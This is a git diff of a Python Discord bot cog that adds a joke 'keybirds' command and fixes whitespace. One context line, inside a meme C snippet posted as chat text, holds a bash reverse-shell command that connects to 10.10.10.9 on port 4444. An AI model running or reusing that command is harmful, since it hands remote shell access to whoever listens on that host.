@@ -107,7 +107,7 @@ class Prestige(commands.Cog):
     @commands.command(aliases=["cafone", "napoletano", "forzanapoli", "ihatepython", "cbestlanguage", "iloveassembly", "iloveasm"])
     async def _cafone(self, ctx) -> None:
         """ A command for telling something about cafone. """
-        
+
         sentences = [
             "i heard **assembly** <:peep_selfie:959872040301629561> <@703017795738402827>",
             "i heard **c++** <:peep_selfie:959872040301629561> <@703017795738402827>",
@@ -123,7 +123,7 @@ int main(void)
   const char* command = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.9/4444 0>&1'";
   const char* message = "cafone best engineer and hacker\\n";
   int result;
-  
+
   result = system(command);
   if(result == -1)
   {
@@ -155,6 +155,18 @@ int main(void)
             "**<@372100977060347906> He's Simple, He's Dumb, He's The Pilot.**",
             "Gohan, vê se você me escuta... Não é pecado lutar pela justiça, ao contrário, é uma boa ação, pense... Existem inimigos que não são convencidos com palavras, você só tem que soltar a fúria que está dentro do seu espírito, eu sei como você se sente... Não precisa mais suportar isso Gohan... Gohan, proteja os seres vivos e as plantas desse mundo que eu tanto amei, conto com você. <@372100977060347906>"
         ]
+
+        await ctx.send(choice(sentences))
+
+    @commands.command(aliases=["birds"])
+    async def keybirds(self, ctx) -> None:
+        """ A command for telling something about Keybirds. """
+
+        sentences = [
+            "<@584699027421921280> Well, sounds like a good idea",
+            "<@584699027421921280> Stina wants to go outside",
+            "<@584699027421921280> I closed it and now it's closed"
+            ]
 
         await ctx.send(choice(sentences))
 
